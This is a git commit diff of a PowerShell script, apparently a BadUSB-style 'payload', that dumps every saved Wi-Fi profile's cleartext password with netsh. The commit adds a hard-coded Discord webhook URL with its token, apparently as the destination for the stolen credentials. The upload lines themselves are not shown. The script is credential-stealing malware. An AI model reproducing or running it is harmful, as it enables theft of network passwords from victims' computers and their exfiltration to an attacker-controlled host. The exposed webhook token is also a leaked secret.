bacb67f27c36c57cd8d997c73e4935e0c36c3b09
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-10 08:45:48 +0100

    Update Windows-Passwords.ps1

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -1,4 +1,5 @@
 Write-Output "Comenzando payload"
+$discord = 'https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqsloWyBulkjPktt7zdS6QqDLeaUyovN4pFrWMsBD3fP2ue0ubyBYMNGms'
 netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+' 
